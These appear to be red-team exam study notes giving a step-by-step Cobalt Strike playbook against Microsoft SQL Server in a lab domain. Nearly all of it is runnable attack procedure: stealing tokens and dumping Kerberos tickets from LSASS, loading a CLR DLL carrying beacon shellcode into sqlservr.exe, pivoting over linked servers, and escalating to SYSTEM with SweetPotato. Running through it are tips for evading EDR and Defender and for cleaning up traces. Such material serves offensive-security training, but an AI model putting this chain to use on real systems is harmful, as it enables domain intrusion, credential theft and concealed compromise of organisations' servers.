# Microsoft SQL Server

Attack chain: Enumerate SQL servers → Identify high-privilege principals → Impersonate to gain sysadmin → Execute CLR payload for code execution → Move laterally via SQL links → Escalate via SeImpersonatePrivilege.

**Why SQL servers matter:** SQL servers often run as a domain service account with elevated privileges (`SeImpersonatePrivilege`). Sysadmin users can execute OS code via CLR. Linked servers allow pivoting deeper into segmented networks without direct attacker connectivity.

* [Load SQL-BOF](#load-sql-bof-aggressor-script)
* [SQL Enumeration](#sql-enumeration)
* [Impersonation](#impersonation)
* [Code Execution via SQL CLR](#code-execution-via-sql-clr)
* [SQL Lateral Movement](#sql-lateral-movement)
* [SQL Privilege Escalation](#sql-privilege-escalation)

---

## Load SQL-BOF Aggressor Script

Before running any `sql-*` commands, load the SQL-BOF CNA script:

**Cobalt Strike → Script Manager → Load → `C:\Tools\SQL-BOF\SQL\SQL.cna`**

> `OPSEC-SAFE` — SQL-BOF uses Beacon Object Files (BOFs). BOFs execute directly inside the beacon thread without spawning a child process. All `sql-*` commands below run in-beacon.

---

## SQL Enumeration

**Why:** Before touching any SQL server, you must identify which servers exist, how they authenticate, and whether your current user has any standing privileges. Starting blind wastes time and risks triggering alerts on servers you have no path through.

### Find SQL servers via SPN (Kerberos-registered instances)

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

> `OPSEC-SAFE` — LDAP query runs over the existing domain connection inside the beacon. No child process.  
> `samAccountType=805306368` = user/computer accounts. MSSQLSvc SPN means the SQL instance is configured for Kerberos authentication. The SPN format `MSSQLSvc/hostname:port` also tells you the exact service principal name you need to request tickets for later.

### Find SQL/DB-related groups (reveals who has sysadmin)

```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

> `OPSEC-SAFE` — LDAP query only.  
> `samAccountType=268435456` = security groups. You are looking for groups whose members may have sysadmin roles on the SQL instance. This reveals the attack path: find a domain user who is a member of a SQL admin group, then impersonate that user.

### Port scan for SQL instances (fallback when no SPNs)

```
portscan 10.10.120.0/23 1433 arp 1024
```

> `OPSEC-CAUTION` — ARP-based network scan generates significant traffic and can trigger NDR/IDS. Use only when LDAP SPN enumeration yields nothing.

### Query specific SQL instance details

```
sql-1434udp 10.10.120.20       # UDP broadcast — finds instance name and version without auth
sql-info lon-db-1              # auth mode, version, linked servers, config overview
sql-whoami lon-db-1            # your current login name + role on this instance
sql-query lon-db-1 "SELECT @@SERVERNAME"   # verify which server you are connected to
```

> `OPSEC-SAFE` — all SQL-BOF commands run via BOF in-beacon, no child process.  
> `sql-info` is critical first step — tells you whether Windows Auth (Kerberos) or SQL Auth is in use, and whether linked servers exist.  
> `sql-whoami` tells you if you are `public/guest` (low priv) or `sysadmin` (full control). Guest means you need to escalate via impersonation.

### Check xp_cmdshell status

```sql
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```

> `OPSEC-CAUTION` — querying `sys.configurations` is logged if SQL auditing is enabled.  
> `value=0` = disabled. **Do not enable xp_cmdshell for the exam** — it spawns `cmd.exe` as a direct child of `sqlservr.exe`, which is a Tier 1 EDR detection trigger. SQL CLR is the correct approach (code runs inside the SQL process with no child spawn).

### Enable xp_cmdshell (last resort, non-exam use)

```
sql-enablexp lon-db-1
```

> `OPSEC-UNSAFE` — spawns `cmd.exe` as a child of `sqlservr.exe`. Heavily signatured by Defender and EDR products. Avoid in the exam.

---

## Impersonation

**Why:** You may authenticate as a low-privilege domain user (e.g. `pchilds`) who has only `public/guest` on the SQL server. A different domain user (e.g. `rsteel`) may hold `sysadmin`. You cannot exploit sysadmin-level features (CLR, xp_cmdshell) without first authenticating as that privileged user.  
SQL Server uses Windows authentication (Kerberos) — so "authenticating as rsteel" means presenting rsteel's Kerberos ticket or Windows access token to the SQL instance.

### Method 1 — Steal Token from a Running Process (preferred when rsteel has a process)

> `OPSEC-SAFE` — token theft stays in-process, no new process spawned.

```
krb_triage                           # list all Kerberos tickets cached on this host
process_browser                      # find all running processes — look for one owned by rsteel
steal_token <pid>                    # steal rsteel's Windows access token from that process
sql-whoami lon-db-1                  # verify you now appear as rsteel with sysadmin role
```

> `krb_triage` shows what tickets are already in memory — tells you who is logged in and whether their TGT is available.  
> `steal_token` duplicates the access token from the target process into your beacon. Since SQL Server uses Windows/Kerberos auth, holding rsteel's token means the SQL connection will authenticate as rsteel.  
> After confirming sysadmin access, use `rev2self` to drop the token when no longer needed.

### Method 2 — Kerberos Ticket Manipulation (when no rsteel process exists)

> `OPSEC-CAUTION` — `krb_dump` touches LSASS. `make_token` creates a Type 9 logon event (Event ID 4648 in Security log).

**Step 1 — Dump rsteel's TGT:**

```
krb_triage                                          # confirm rsteel has a TGT cached in LSASS
krb_dump /user:rsteel /service:krbtgt               # extract rsteel's TGT — output is base64 kirbi
```

> `krb_dump` reads the Kerberos ticket cache from LSASS. The TGT is the master ticket — it proves rsteel's identity to the KDC and lets you request any service ticket on rsteel's behalf.

**Step 2 — Use rsteel's TGT to request an MSSQLSvc service ticket:**

```
krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[base64-TGT-from-above]
```

> This asks the KDC: "I have rsteel's TGT, give me a service ticket for `MSSQLSvc/lon-db-1:1433`."  
> The KDC validates the TGT and returns a service ticket encrypted with the SQL service account's key. When presented to lon-db-1, it proves you are rsteel — no password needed.  
> The SPN (`MSSQLSvc/lon-db-1.contoso.com:1433`) must match exactly what the SQL server is registered as — use the output from the earlier LDAP SPN enumeration.

**Step 3 — Save and inject the service ticket:**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\mssql.kirbi", [Convert]::FromBase64String("[base64-ST-output]"))
```

```
make_token CONTOSO\rsteel FakePass       # create a logon session — password is irrelevant (never validated)
kerberos_ticket_use C:\Users\Attacker\Desktop\mssql.kirbi   # inject service ticket into that session
run klist                                # verify ticket appears in klist output
sql-whoami lon-db-1                      # confirm sysadmin role
```

> `make_token` creates a Type 9 (NewCredentials) logon session. The password you supply is **never validated against AD** — this is by design for network logon sessions. Kerberos tickets override NTLM.  
> `kerberos_ticket_use` injects the .kirbi into the beacon's Kerberos cache so subsequent network connections use it.  
> Delete the .kirbi file from disk after use: `rm C:\Users\Attacker\Desktop\mssql.kirbi`

---

## Code Execution via SQL CLR

**Why:** With sysadmin access, SQL CLR (Common Language Runtime) lets you load a .NET assembly (DLL) directly into SQL Server's memory and execute arbitrary .NET code. This is far stealthier than `xp_cmdshell` because code runs *inside* `sqlservr.exe` — no child process spawned, no `cmd.exe` in the process tree.

### Step 1 — Check and enable SQL CLR

```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
sql-enableclr lon-db-1
```

> `OPSEC-CAUTION` — enabling CLR changes SQL Server's `sp_configure` state. This is logged in `sys.configurations` change history and may alert a SIEM if SQL config auditing is active.  
> CLR must be enabled for the server to accept and execute your assembly.

### Step 2 — Generate SMB beacon shellcode

**Payloads → Windows Stageless Payload:**
- Listener: `smb` — SMB named pipe beacon for internal lateral movement (works when direct TCP is blocked by firewalls)
- Output: `Raw` — raw shellcode bytes, no PE wrapper
- Exit Function: `Thread` — the thread exits but the SQL process stays running, avoiding crashes
- x64: ✓
- Save: `C:\Payloads\smb_x64.xthread.bin`

> `OPSEC-CAUTION` — unobfuscated shellcode embedded in the DLL may be flagged by Defender on disk. For the exam, generate via a malleable profile with sleep mask and obfuscation enabled.  
> `Thread` exit function is important — `Process` exit would kill `sqlservr.exe`, terminating the SQL service and creating a noisy crash event.

### Step 3 — Build the CLR DLL in Visual Studio

**Visual Studio → New Project → Class Library (.NET Framework) C#:**
- Project name: `MyProcedure`
- Place solution and project in same directory: ✓ (simplifies the output path)
- Framework: .NET Framework 4.7.2 (must match what SQL Server's CLR runtime supports)

**Add shellcode as embedded resource:**
1. Solution Explorer → right-click project → Add → Existing Item → select `C:\Payloads\smb_x64.xthread.bin`
2. Click the file in Solution Explorer → Properties → Build Action: **Embedded Resource**

> Embedding as a resource bundles the shellcode *inside* the DLL binary. This avoids a separate file write to disk during execution — the DLL carries its own payload.

**Critical: verify the embedded resource name in code:**

```c#
// Resource name format: <AssemblyName>.<filename>
// Must match exactly — case-sensitive, dots preserved
using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
```

> Mismatch here (`smb.x64.xthread.bin` vs `smb_x64.xthread.bin`) causes a null reference — the payload silently fails with no error. Double-check by looking at the file name in Solution Explorer.

**Build:** Switch to Release mode → Build → Build Solution  
Output DLL: `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`

### Step 4 — Load and execute the CLR payload on the SQL server

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

> `OPSEC-CAUTION` — SQL-BOF reads the DLL from your attacker machine, uploads it to SQL Server's CLR runtime, registers it as an unsafe assembly, creates a stored procedure (`MyProcedure`), and calls it.  
> The shellcode executes inside `sqlservr.exe` via `VirtualAlloc` + `WriteProcessMemory` + `CreateThread`. The beacon runs as the SQL service account (e.g., `NT Service\MSSQLSERVER`).  
> `TRUSTWORTHY` must be set on the database, or the assembly must be signed — `sql-clr` handles this automatically.

### Step 5 — Link to the new SMB beacon

The CLR payload created an SMB named pipe beacon inside `sqlservr.exe`. To connect to it, your beacon must present a valid CIFS/SMB service ticket for lon-db-1.

**Option A — Link from pchilds' beacon (preferred — Windows auto-requests CIFS ticket):**

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-SAFE` — run this from the original pchilds medium-integrity beacon. Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` service ticket from the KDC, then authenticates the SMB named pipe connection. No manual ticket work.  
> The TSVCPIPE name is defined in your CS SMB listener configuration. Hit TAB to autocomplete if you forget it.

**Option B — Manually request CIFS ticket (when running from an impersonated/no-TGT context):**

```
krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[base64-output-from-above]"))
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
run klist                                                      # confirm cifs/lon-db-1 ticket present
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-CAUTION` — .kirbi file written to disk. Delete after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
> Use Option B when your current beacon context (e.g. an impersonated token session that lacks a valid TGT) cannot auto-request CIFS tickets.  
> **Why CIFS specifically:** SMB named pipe authentication uses the CIFS service class, not MSSQLSvc. You need a separate ticket for the link step.

### Step 6 — Disable CLR after use

```
sql-disableclr lon-db-1
```

> `OPSEC-SAFE` — clean up. Reverting CLR to disabled reduces your footprint and removes the exploitation path for defenders reviewing SQL config after the fact.

---

## SQL Lateral Movement

**Why:** SQL Server linked server relationships allow one SQL instance to query another on your behalf. If the link runs with sysadmin credentials on the downstream server, you can execute CLR payloads there without needing direct network access from your attacker machine. This is how you reach SQL servers in network segments blocked from your attacker host.

### Enumerate links and verify downstream privileges

```
sql-links lon-db-1                          # show all linked servers configured on lon-db-1
sql-whoami lon-db-1 "" lon-db-2             # check your privilege level on lon-db-2 via the link
```

> `OPSEC-SAFE` — BOF-based queries, no child process.  
> The `""` second argument means no intermediate hop — direct link query from lon-db-1 to lon-db-2.  
> If you see `sysadmin` on lon-db-2 via the link, the link is configured with elevated credentials and is exploitable.

### Enable RPC Out on the link (required for CLR execution)

```
sql-checkrpc lon-db-1                       # query current RPC Out status on all links
sql-enablerpc lon-db-1 lon-db-2             # enable RPC Out on the link to lon-db-2
```

> `OPSEC-CAUTION` — modifying link configuration is logged in SQL Server error log and visible in `sys.servers`.  
> **Why RPC Out is needed:** `EXECUTE AT linked_server` (which is how SQL-BOF executes CLR remotely) requires RPC Out to be enabled on the link. Without it, you can query data but cannot execute stored procedures on the remote server.

### Execute CLR payload on lon-db-2 via the link

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

> `OPSEC-CAUTION` — same CLR injection as before, but tunneled through the lon-db-1 → lon-db-2 SQL link.  
> The fourth argument `""` = no intermediate, fifth argument `lon-db-2` = target linked server.  
> The beacon executes inside `sqlservr.exe` on lon-db-2, running as that server's MSSQL service account.

### Link to the new beacon on lon-db-2 (run from lon-db-1's beacon)

```
link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-SAFE` — SMB named pipe connection from lon-db-1 to lon-db-2.  
> **Critical: run this command from the lon-db-1 beacon, not the attacker machine.**  
> **Why:** lon-db-2 may be on a separate network segment with firewall rules blocking direct attacker-to-lon-db-2 SMB traffic. lon-db-1 is network-adjacent to lon-db-2 (the SQL link already proves connectivity). By linking from lon-db-1's beacon, you build a chain: `Attacker CS → lon-db-1 beacon → lon-db-2 beacon`.  
> The lon-db-1 beacon runs as the MSSQL service account, which has CIFS access to lon-db-2 (same account that drives the SQL link).

### Disable RPC after use

```
sql-disablerpc lon-db-1 lon-db-2
```

> `OPSEC-SAFE` — clean up. Revert RPC Out to reduce footprint.

---

## SQL Privilege Escalation

**Why:** The MSSQL service account running your beacon has `SeImpersonatePrivilege` by design — SQL Server requires it to impersonate client connections. This privilege lets a local service account impersonate any user (including SYSTEM) via Windows COM/DCOM authentication coercion. SweetPotato exploits this.

### Identify the privilege

```
whoami /priv    # BOF - check token privileges
```

> Look for `SeImpersonatePrivilege: Enabled`.  
> The MSSQL service account (`NT Service\MSSQLSERVER`) always holds this privilege — it is granted by Windows as part of service account setup, not misconfiguration.

### Generate TCP-local payload (SYSTEM beacon)

**Payloads → Windows Stageless Payload:**
- Listener: `tcp-local` — binds only to `127.0.0.1`, no external network exposure
- Output: Windows EXE
- Exit Function: Process
- x64: ✓
- Save: `C:\Payloads\tcp-local_x64.exe`

> `tcp-local` is necessary because lon-db-2 may have no inbound firewall path back to your team server. The beacon connects locally and you reach it via the existing beacon chain (attacker → lon-db-1 → lon-db-2 → SYSTEM beacon on lon-db-2).

### Upload payload to a less-monitored directory

```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
pwd
upload C:\Payloads\tcp-local_x64.exe
```

> `OPSEC-CAUTION` — file write to disk.  
> **Why this directory:** The MSSQL service account owns its own service profile. `WindowsApps` within that profile is writable by the service account and less aggressively scanned by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. For the exam, generate a custom artifact to avoid static Defender signatures on the EXE.

### Exploit SeImpersonatePrivilege with SweetPotato

```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

> `OPSEC-CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). SweetPotato creates a fake COM server, coerces a privileged Windows service to authenticate to it via DCOM, captures the SYSTEM token, then runs your payload under that token.  
> The result: your EXE runs as `NT AUTHORITY\SYSTEM`.  
> For the exam: ensure `spawnto` is set to a non-signatured binary in your malleable profile (`post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }`).

### Connect to the SYSTEM beacon

```
connect localhost 1337
```

> `OPSEC-SAFE` — loopback TCP connection from lon-db-2's MSSQL beacon to the newly spawned SYSTEM beacon on the same host. No external network traffic.  
> Port `1337` is defined in your `tcp-local` listener configuration.

New beacon spawned as `NT AUTHORITY\SYSTEM` on lon-db-2.
